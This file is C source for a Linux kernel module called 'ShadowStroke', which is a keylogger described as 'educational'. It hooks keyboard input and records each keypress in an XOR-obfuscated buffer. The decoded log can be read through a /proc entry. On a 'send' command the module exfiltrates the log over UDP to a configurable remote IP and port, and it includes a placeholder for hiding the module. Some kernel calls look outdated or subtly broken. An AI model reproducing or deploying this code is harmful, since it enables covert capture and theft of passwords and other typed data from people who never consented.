#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/mutex.h>
#include <linux/in.h>
#include <linux/net.h>
#include <net/sock.h>
#include <linux/string.h>

#define SHADOWSTROKE_BUF_SIZE 4096

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ShadowStroke Team");
MODULE_DESCRIPTION("A simple Linux kernel keylogger for educational purposes.");
MODULE_VERSION("0.2");

static struct input_handler shadowstroke_input_handler;
static struct proc_dir_entry *shadowstroke_proc_entry;
static DEFINE_MUTEX(shadowstroke_buf_mutex);

static int shadowstroke_buf_size = 4096;
module_param(shadowstroke_buf_size, int, 0600);
MODULE_PARM_DESC(shadowstroke_buf_size, "Keystroke buffer size");

static char *log_mode = "all";
module_param(log_mode, charp, 0600);
MODULE_PARM_DESC(log_mode, "Logging mode: 'all' or 'alnum'");

static char *keystroke_buf = NULL;
static size_t buf_head = 0, buf_tail = 0;

static char shadowstroke_xor_key = 0x5A; // default XOR key
module_param(shadowstroke_xor_key, byte, 0600);
MODULE_PARM_DESC(shadowstroke_xor_key, "XOR key for keystroke obfuscation");

static char *remote_ip = NULL;
static int remote_port = 0;
module_param(remote_ip, charp, 0600);
MODULE_PARM_DESC(remote_ip, "Remote IPv4 address for UDP exfiltration");
module_param(remote_port, int, 0600);
MODULE_PARM_DESC(remote_port, "Remote UDP port for exfiltration");

static const char *keymap[256] = {
    [KEY_A] = "a", [KEY_B] = "b", [KEY_C] = "c", [KEY_D] = "d", [KEY_E] = "e",
    [KEY_F] = "f", [KEY_G] = "g", [KEY_H] = "h", [KEY_I] = "i", [KEY_J] = "j",
    [KEY_K] = "k", [KEY_L] = "l", [KEY_M] = "m", [KEY_N] = "n", [KEY_O] = "o",
    [KEY_P] = "p", [KEY_Q] = "q", [KEY_R] = "r", [KEY_S] = "s", [KEY_T] = "t",
    [KEY_U] = "u", [KEY_V] = "v", [KEY_W] = "w", [KEY_X] = "x", [KEY_Y] = "y",
    [KEY_Z] = "z",
    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4", [KEY_5] = "5",
    [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8", [KEY_9] = "9", [KEY_0] = "0",
    [KEY_SPACE] = " ", [KEY_ENTER] = "\n", [KEY_DOT] = ".", [KEY_COMMA] = ",",
    [KEY_MINUS] = "-", [KEY_EQUAL] = "=", [KEY_SLASH] = "/", [KEY_SEMICOLON] = ";",
    [KEY_APOSTROPHE] = "'", [KEY_LEFTBRACE] = "[", [KEY_RIGHTBRACE] = "]",
    [KEY_BACKSLASH] = "\\", [KEY_GRAVE] = "`",
};
static const char *keymap_shift[256] = {
    [KEY_A] = "A", [KEY_B] = "B", [KEY_C] = "C", [KEY_D] = "D", [KEY_E] = "E",
    [KEY_F] = "F", [KEY_G] = "G", [KEY_H] = "H", [KEY_I] = "I", [KEY_J] = "J",
    [KEY_K] = "K", [KEY_L] = "L", [KEY_M] = "M", [KEY_N] = "N", [KEY_O] = "O",
    [KEY_P] = "P", [KEY_Q] = "Q", [KEY_R] = "R", [KEY_S] = "S", [KEY_T] = "T",
    [KEY_U] = "U", [KEY_V] = "V", [KEY_W] = "W", [KEY_X] = "X", [KEY_Y] = "Y",
    [KEY_Z] = "Z",
    [KEY_1] = "!", [KEY_2] = "@", [KEY_3] = "#", [KEY_4] = "$", [KEY_5] = "%",
    [KEY_6] = "^", [KEY_7] = "&", [KEY_8] = "*", [KEY_9] = "(", [KEY_0] = ")",
    [KEY_SPACE] = " ", [KEY_ENTER] = "\n", [KEY_DOT] = ">", [KEY_COMMA] = "<",
    [KEY_MINUS] = "_", [KEY_EQUAL] = "+", [KEY_SLASH] = "?", [KEY_SEMICOLON] = ":",
    [KEY_APOSTROPHE] = "\"", [KEY_LEFTBRACE] = "{", [KEY_RIGHTBRACE] = "}",
    [KEY_BACKSLASH] = "|", [KEY_GRAVE] = "~",
};

static bool shift_down = false, capslock_on = false;

static bool logging_enabled = true;

static bool is_alnum_key(unsigned int code) {
    return (code >= KEY_A && code <= KEY_Z) || (code >= KEY_0 && code <= KEY_9);
}

static void shadowstroke_log_char(const char *c, unsigned int code)
{
    size_t len = strlen(c);
    size_t i;
    if (!logging_enabled)
        return;
    if (strcmp(log_mode, "alnum") == 0 && !is_alnum_key(code))
        return;
    mutex_lock(&shadowstroke_buf_mutex);
    for (i = 0; i < len; ++i) {
        keystroke_buf[buf_head] = c[i] ^ shadowstroke_xor_key;
        buf_head = (buf_head + 1) % shadowstroke_buf_size;
        if (buf_head == buf_tail) // buffer full, overwrite oldest
            buf_tail = (buf_tail + 1) % shadowstroke_buf_size;
    }
    mutex_unlock(&shadowstroke_buf_mutex);
}

static bool shadowstroke_should_log(void)
{

    return true;
}


static void shadowstroke_hide_module(void)
{

}

static int shadowstroke_event(struct input_handle *handle, unsigned int type, unsigned int code, int value)
{
    if (type == EV_KEY) {
        if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT)
            shift_down = value;
        else if (code == KEY_CAPSLOCK && value == 1)
            capslock_on = !capslock_on;
        else if (value == 1) { // Key press
            const char *c = NULL;
            bool upper = (shift_down ^ capslock_on);
            if (upper)
                c = keymap_shift[code];
            else
                c = keymap[code];
            if (c && *c && shadowstroke_should_log())
                shadowstroke_log_char(c, code);
        }
    }
    return 0;
}

static int shadowstroke_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id)
{
    struct input_handle *handle;
    int error;

    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "shadowstroke_handle";

    error = input_register_handle(handle);
    if (error) {
        kfree(handle);
        return error;
    }

    error = input_open_device(handle);
    if (error) {
        input_unregister_handle(handle);
        kfree(handle);
        return error;
    }

    printk(KERN_INFO "[ShadowStroke] Connected to device: %s\n", dev_name(&dev->dev));
    return 0;
}

static void shadowstroke_disconnect(struct input_handle *handle)
{
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
    printk(KERN_INFO "[ShadowStroke] Disconnected from device.\n");
}

static const struct input_device_id shadowstroke_ids[] = {
    { .driver_info = 1 },
    { },
};

MODULE_DEVICE_TABLE(input, shadowstroke_ids);

static struct input_handler shadowstroke_input_handler = {
    .event = shadowstroke_event,
    .connect = shadowstroke_connect,
    .disconnect = shadowstroke_disconnect,
    .name = "shadowstroke",
    .id_table = shadowstroke_ids,
};

static int shadowstroke_send_udp(const char *data, size_t len)
{
    struct socket *sock;
    struct sockaddr_in addr;
    int ret = 0;
    mm_segment_t oldfs;

    if (!remote_ip || remote_port == 0)
        return -EINVAL;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
    if (ret < 0)
        return ret;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(remote_port);
    addr.sin_addr.s_addr = in_aton(remote_ip);

    oldfs = get_fs();
    set_fs(KERNEL_DS);
    ret = sock_sendmsg(sock, &(struct msghdr){
        .msg_name = &addr,
        .msg_namelen = sizeof(addr),
        .msg_iov = &(struct kvec){ .iov_base = (void *)data, .iov_len = len },
        .msg_iovlen = 1,
        .msg_control = NULL,
        .msg_controllen = 0,
        .msg_flags = 0,
    }, len);
    set_fs(oldfs);

    sock_release(sock);
    return ret;
}

static unsigned int shadowstroke_checksum(const char *buf, size_t head, size_t tail, size_t size) {
    unsigned int sum = 0;
    size_t i = tail;
    while (i != head) {
        sum += (unsigned char)buf[i];
        i = (i + 1) % size;
    }
    return sum;
}

static ssize_t shadowstroke_proc_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
    ssize_t ret = 0;
    size_t len = 0, i;
    char *tmp;
    char checksum_str[64];
    unsigned int sum;
    tmp = kmalloc(shadowstroke_buf_size, GFP_KERNEL);
    if (!tmp)
        return -ENOMEM;
    mutex_lock(&shadowstroke_buf_mutex);
    i = buf_tail;
    while (i != buf_head && len < shadowstroke_buf_size - 1) {
        tmp[len++] = keystroke_buf[i] ^ shadowstroke_xor_key;
        i = (i + 1) % shadowstroke_buf_size;
    }
    tmp[len] = '\0';
    sum = shadowstroke_checksum(keystroke_buf, buf_head, buf_tail, shadowstroke_buf_size);
    mutex_unlock(&shadowstroke_buf_mutex);

    snprintf(checksum_str, sizeof(checksum_str), "\n[ShadowStroke] Checksum: 0x%08x\n", sum);
    if (*ppos < len) {
        if (count > len - *ppos)
            count = len - *ppos;
        if (copy_to_user(buf, tmp + *ppos, count)) {
            kfree(tmp);
            return -EFAULT;
        }
        *ppos += count;
        ret = count;
    } else if (*ppos >= len && *ppos < len + strlen(checksum_str)) {
        size_t cpos = *ppos - len;
        size_t ccount = strlen(checksum_str) - cpos;
        if (count > ccount)
            count = ccount;
        if (copy_to_user(buf, checksum_str + cpos, count)) {
            kfree(tmp);
            return -EFAULT;
        }
        *ppos += count;
        ret = count;
    } else {
        ret = 0;
    }
    kfree(tmp);
    return ret;
}

static ssize_t shadowstroke_proc_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
{
    char kbuf[32];
    size_t to_copy = min(count, sizeof(kbuf) - 1);
    if (copy_from_user(kbuf, buf, to_copy))
        return -EFAULT;
    kbuf[to_copy] = '\0';

    if (strncmp(kbuf, "send", 4) == 0) {
        char *tmp;
        size_t len = 0, i;
        tmp = kmalloc(shadowstroke_buf_size, GFP_KERNEL);
        if (!tmp)
            return -ENOMEM;
        mutex_lock(&shadowstroke_buf_mutex);
        i = buf_tail;
        while (i != buf_head && len < shadowstroke_buf_size - 1) {
            tmp[len++] = keystroke_buf[i] ^ shadowstroke_xor_key;
            i = (i + 1) % shadowstroke_buf_size;
        }
        tmp[len] = '\0';
        mutex_unlock(&shadowstroke_buf_mutex);
        if (len > 0)
            shadowstroke_send_udp(tmp, len);
        kfree(tmp);
    } else if (strncmp(kbuf, "on", 2) == 0) {
        logging_enabled = true;
    } else if (strncmp(kbuf, "off", 3) == 0) {
        logging_enabled = false;
    } else {
        mutex_lock(&shadowstroke_buf_mutex);
        buf_head = buf_tail = 0;
        mutex_unlock(&shadowstroke_buf_mutex);
    }
    return count;
}

static const struct proc_ops shadowstroke_proc_ops = {
    .proc_read = shadowstroke_proc_read,
    .proc_write = shadowstroke_proc_write,
};

static int __init shadowstroke_init(void)
{
    int ret;
    keystroke_buf = kmalloc(shadowstroke_buf_size, GFP_KERNEL);
    if (!keystroke_buf)
        return -ENOMEM;
    ret = input_register_handler(&shadowstroke_input_handler);
    shadowstroke_proc_entry = proc_create("shadowstroke", 0440, NULL, &shadowstroke_proc_ops);
    shadowstroke_hide_module();
    printk(KERN_INFO "[ShadowStroke] Module loaded.\n");
    return ret;
}

static void __exit shadowstroke_exit(void)
{
    if (shadowstroke_proc_entry)
        proc_remove(shadowstroke_proc_entry);
    if (keystroke_buf)
        kfree(keystroke_buf);
    input_unregister_handler(&shadowstroke_input_handler);
    printk(KERN_INFO "[ShadowStroke] Module unloaded.\n");
}

module_init(shadowstroke_init);
module_exit(shadowstroke_exit); 